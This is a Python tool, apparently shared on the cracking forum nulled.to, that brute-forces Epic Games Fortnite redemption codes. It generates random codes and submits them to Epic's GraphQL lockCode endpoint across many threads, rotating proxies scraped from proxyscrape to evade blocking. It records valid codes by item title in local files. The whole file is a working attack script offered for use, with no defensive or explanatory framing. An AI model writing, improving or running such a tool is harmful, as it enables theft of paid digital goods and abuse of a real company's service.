import requests
import time
import threading
import ctypes
import json
from colorama import init, Fore
import os
import chardet
import re
from timeit import default_timer as timer
import random


headers = {
	'accept':'application/json, text/plain, */*',
	'accept-encoding':'gzip, deflate, br',
	'accept-language':'en-US,en;q=0.9',
	'origin':'https://www.epicgames.com',
	'referer':'https://www.epicgames.com/store/en-US/redeem/fortnite?lang=en-US',
	'sec-fetch-mode':'cors',
	'sec-fetch-site':'same-site',
	'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36',
	'x-requested-with':'XMLHttpRequest'
}


init(convert=True)

clear = lambda: os.system('cls')

ctypes.windll.kernel32.SetConsoleTitleW("FotCode | Coded by Strings")
			
showoff = '''

             By Strings from nulled.to                 
                                                                                                                                                                                                                                                     
'''



print(Fore.GREEN+showoff)
print(Fore.WHITE)
time.sleep(2)
mode = int(input("Bruteforce - 1/Check hits - 2: "))
proxyscrapeyes = input("Do you want to use proxyscrape?(Y/N): ")
if proxyscrapeyes == "Y":
	try:
		print('Scraping proxies from proxyscrape')
		url = 'https://api.proxyscrape.com/?request=displayproxies&proxytype=http'
		r = requests.get(url)

		with open('proxies.txt', 'wb') as f:
			f.write(r.content)
			f.close
		print("Done")
	except Exception:
		print("Proxyscrape is down!")
		time.sleep(2)
		exit()
threads = int(input("Enter Threads: "))

os.system('cls')
print(Fore.GREEN+showoff)


premium = 0
free = 0
counter = 0
invalid = 0
valid = 0
error = 0
proxy_counter = 0
ds = 0

proxy_list = []

def get_code(size=5, chars="ABCDEFGHJKLMNPQRSTUVWXYZ23456789"):
	return ''.join(random.choice(chars) for _ in range(size))

def load_proxies():
	with open('proxies.txt','r') as f:
		for x in f.readlines():
			try:
				proxy_list.append(x.replace('\n',''))
			except:
				pass

def safe_print(content):
	print("{}\n".format(content))

def save_premium(name, code):
	with open('codes/'+name+'.txt','a') as f:
		f.write(code + '\n')

used = 0


def set_title():
	elapsed_time = int(time.process_time() - t)
	try:
		ctypes.windll.kernel32.SetConsoleTitleW("ForniteCoder | Checked: " + str(valid+invalid)  + ' | Valid ' + str(valid) + ' | Used ' + str(used) +  ' | Invalid: ' + str(invalid) + ' | Errors: ' + str(error) +' | CPM: '+ str(int(((valid+invalid)/elapsed_time)*60)) + ' | Coded by Strings')
	except Exception:
		pass


def start_checking(proxy):
	global counter
	global invalid
	global valid
	global error
	global proxy_counter
	global proxy_list
	global used
	with requests.Session() as c:
		try:
			code = get_code()+'-'+get_code()+'-'+get_code()+'-'+get_code()
			data={"query":"mutation lockCodeMutation($codeId: String, $locale: String) {CodeRedemption {lockCode(codeId: $codeId, locale: $locale) {success data { namespace title description image eulaIds entitlementName codeUseId } } } }","variables":{"codeId":code,"locale":"en-US"}}
			codecheck=c.post('https://graphql.epicgames.com/graphql', headers=headers,json=data,proxies={'https': proxy})
			if '"success":true,' in codecheck.text:
				parseitem = re.search('''title":"(.*)","description''',codecheck.text)
				valid+=1
				save_premium(parseitem.group(1),code)
				return
			elif 'Code used' in codecheck.text:
				used += 1
				set_title()
				return
			elif 'Request failed with status code 404' in codecheck.text or 'Request failed with status code 400' in codecheck.text:
				invalid+=1
				set_title()
				return
			else:
				error += 1
				return
		except Exception:
			proxy_counter += 1
			error += 1
			if proxy_counter >= len(proxy_list):
				proxy_counter = 0
			return


load_proxies()
t = time.process_time()


while True:
	if threading.active_count() < threads:
			try:
				proxy_counter += 1
				counter += 1
				threading.Thread(target=start_checking, args=(proxy_list[proxy_counter],)).start()
			except Exception:
				if proxy_counter >= len(proxy_list):
					proxy_counter = 0
